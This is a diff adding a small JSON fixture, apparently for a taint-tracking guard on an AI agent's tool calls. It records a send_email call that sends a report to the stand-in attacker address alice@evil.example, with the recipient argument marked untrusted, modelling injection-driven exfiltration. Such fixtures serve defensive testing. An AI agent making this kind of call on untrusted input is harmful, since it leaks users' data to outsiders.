@@ -1,0 +1,7 @@
+{
+  "direction": "call",
+  "server": "gmail",
+  "tool": "send_email",
+  "arguments": {"to": "alice@evil.example", "body": "Here is the report."},
+  "taint": [{"arg": "to", "label": "untrusted"}]
+}
